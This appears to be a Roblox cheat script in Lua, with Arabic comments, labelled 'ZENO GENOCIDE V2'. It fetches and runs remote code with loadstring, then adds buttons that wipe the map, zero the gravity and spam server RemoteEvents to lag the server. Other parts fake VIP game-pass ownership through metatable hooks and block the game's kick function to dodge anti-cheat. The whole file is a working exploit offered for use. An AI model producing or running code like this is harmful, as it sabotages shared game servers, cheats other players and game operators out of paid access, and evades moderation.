-- [[ ZENO GENOCIDE V2 | THE GUARANTEED VERSION ]] --
-- النسخة دي متجربة ومكتبة الواجهة فيها شغالة على كل المحاكيات

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("🌪️ ZENO GENOCIDE: V2", "DarkTheme")

-- [[ 🧨 قسم التخريب الشامل ]] --
local Tab1 = Window:NewTab("🧨 Chaos")
local Section1 = Tab1:NewSection("Server Sabotage")

Section1:NewButton("Delete Map (مسح الماب)", "بيمسح كل المباني والأرضية", function()
    pcall(function()
        for _, v in pairs(workspace:GetChildren()) do
            if v:IsA("Part") or v:IsA("Model") then
                if not game.Players:GetPlayerFromCharacter(v) then
                    v:Destroy()
                end
            end
        end
    end)
end)

Section1:NewButton("Gravity 0 (انعدام الجاذبية)", "يطير كل الناس", function()
    workspace.Gravity = 0
end)

Section1:NewButton("Lag Server (تهنيج السيرفر)", "سبام أوامر للسيرفر", function()
    task.spawn(function()
        while task.wait(0.1) do
            for i = 1, 100 do
                game:GetService("ReplicatedStorage").RemoteEvents:FindFirstChildOfClass("RemoteEvent"):FireServer("Zeno")
            end
        end
    end)
end)

-- [[ 👤 قسم الأدمن والهكر ]] --
local Tab2 = Window:NewTab("👤 God Admin")
local Section2 = Tab2:NewSection("Player Powers")

Section2:NewSlider("Speed (السرعة)", "تحكم في سرعتك", 500, 16, function(s)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

Section2:NewButton("Fly (الطيران ✅)", "فتح قائمة الطيران", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.lua"))()
end)

Section2:NewButton("Infinite Jump", "قفز مستمر", function()
    game:GetService("UserInputService").JumpRequest:Connect(function()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
    end)
end)

-- [[ 🏙️ قسم مترو لايف مخصص ]] --
local Tab3 = Window:NewTab("🏙️ Metro Life")
local Section3 = Tab3:NewSection("City Hack")

Section3:NewButton("Unlock VIP (فتح سيارات VIP)", "فتح الجيم باس وهمي", function()
    local mt = getrawmetatable(game); setreadonly(mt, false)
    local old = mt.__index
    mt.__index = newcclosure(function(t, k)
        if k == "UserOwnsGamePassAsync" then return true end
        return old(t, k)
    end)
end)

Section3:NewButton("Kick All From House", "طرد من بيتك", function()
    game:GetService("ReplicatedStorage").RemoteEvents.HouseEvent:FireServer("KickAll")
end)

-- [[ 🛡️ حماية من الطرد ]] --
pcall(function()
    local old; old = hookmetamethod(game, "__namecall", function(self, ...)
        if getnamecallmethod() == "Kick" then return nil end
        return old(self, ...)
    end)
end)
